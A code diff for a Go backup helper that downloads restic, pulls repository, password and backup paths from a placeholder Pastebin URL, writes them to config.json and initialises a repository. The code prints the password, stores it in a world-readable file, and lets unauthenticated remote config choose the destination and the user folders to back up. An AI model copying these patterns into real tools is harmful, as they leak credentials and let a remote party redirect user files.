@@ -26,14 +26,27 @@ type release struct {
 type config struct {
 	Repo     string
 	Password string
+	Paths    []string
 }
 
-var embeddedConfig = config{
-	Repo:     "~/tmp/test-backup",
-	Password: "test password",
-}
+const (
+	pastebinURL = "https://pastebin.com/raw/example"
+	configFile  = "config.json"
+)
 
-const pastebinURL = "https://pastebin.com/raw/example"
+func defaultEmbeddedConfig() config {
+	home, _ := os.UserHomeDir()
+	paths := []string{
+		filepath.Join(home, "Documents"),
+		filepath.Join(home, "Pictures"),
+		filepath.Join(home, "Desktop"),
+	}
+	return config{
+		Repo:     "~/tmp/test-backup",
+		Password: "test password",
+		Paths:    paths,
+	}
+}
 
 func main() {
 	binDir := filepath.Join(".", "bin")
@@ -64,6 +77,14 @@ func main() {
 	cfg := getConfig()
 	fmt.Println("repository:", cfg.Repo)
 	fmt.Println("password:", cfg.Password)
+	if err := ensureRepo(resticPath, cfg.Repo, cfg.Password); err != nil {
+		fmt.Fprintf(os.Stderr, "failed to ensure repo: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Println("paths to backup:")
+	for _, p := range cfg.Paths {
+		fmt.Println(" -", p)
+	}
 }
 
 func downloadRestic(binDir, resticPath string) error {
@@ -159,7 +180,7 @@ func downloadRestic(binDir, resticPath string) error {
 }
 
 func getConfig() config {
-	cfg := embeddedConfig
+	cfg := defaultEmbeddedConfig()
 
 	repoEnv, repoEnvSet := os.LookupEnv("RESTIC-REPO")
 	passEnv, passEnvSet := os.LookupEnv("RESTIC-REPO-PASSWORD")
@@ -170,28 +191,55 @@ func getConfig() config {
 		cfg.Password = passEnv
 	}
 
-	if repoEnvSet && passEnvSet {
-		return cfg
+	if !(repoEnvSet && passEnvSet) {
+		pb, err := fetchPastebinConfig(pastebinURL)
+		if err == nil {
+			if !repoEnvSet {
+				if v, ok := pb["restic-repo"].(string); ok {
+					cfg.Repo = v
+				}
+			}
+			if !passEnvSet {
+				if v, ok := pb["restic-repo-password"].(string); ok {
+					cfg.Password = v
+				}
+			}
+			if v, ok := pb["paths"].([]any); ok {
+				paths := make([]string, 0, len(v))
+				for _, p := range v {
+					if s, ok := p.(string); ok {
+						paths = append(paths, s)
+					}
+				}
+				if len(paths) > 0 {
+					cfg.Paths = paths
+				}
+			}
+		}
 	}
 
-	pb, err := fetchPastebinConfig(pastebinURL)
-	if err == nil {
-		if !repoEnvSet {
-			if v, ok := pb["restic-repo"]; ok {
-				cfg.Repo = v
+	if data, err := os.ReadFile(configFile); err == nil {
+		var fcfg config
+		if err := json.Unmarshal(data, &fcfg); err == nil {
+			if fcfg.Repo != "" {
+				cfg.Repo = fcfg.Repo
+			}
+			if fcfg.Password != "" {
+				cfg.Password = fcfg.Password
+			}
+			if len(fcfg.Paths) > 0 {
+				cfg.Paths = fcfg.Paths
 			}
 		}
-		if !passEnvSet {
-			if v, ok := pb["restic-repo-password"]; ok {
-				cfg.Password = v
-			}
-		}
+	} else if os.IsNotExist(err) {
+		data, _ := json.MarshalIndent(cfg, "", "  ")
+		_ = os.WriteFile(configFile, data, 0644)
 	}
 
 	return cfg
 }
 
-func fetchPastebinConfig(url string) (map[string]string, error) {
+func fetchPastebinConfig(url string) (map[string]any, error) {
 	resp, err := http.Get(url)
 	if err != nil {
 		return nil, err
@@ -200,9 +248,32 @@ func fetchPastebinConfig(url string) (map[string]string, error) {
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("unexpected status: %s", resp.Status)
 	}
-	var data map[string]string
+	var data map[string]any
 	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
 		return nil, err
 	}
 	return data, nil
+}
+
+func ensureRepo(resticPath, repo, password string) error {
+	repoPath := expandUser(repo)
+	if _, err := os.Stat(filepath.Join(repoPath, "config")); err == nil {
+		fmt.Println("restic repository found at", repoPath)
+		return nil
+	}
+	fmt.Println("initializing restic repository at", repoPath)
+	cmd := exec.Command(resticPath, "-r", repoPath, "init")
+	cmd.Env = append(os.Environ(), "RESTIC_PASSWORD="+password)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	return cmd.Run()
+}
+
+func expandUser(p string) string {
+	if strings.HasPrefix(p, "~") {
+		if home, err := os.UserHomeDir(); err == nil {
+			return filepath.Join(home, strings.TrimPrefix(p, "~/"))
+		}
+	}
+	return p
 }
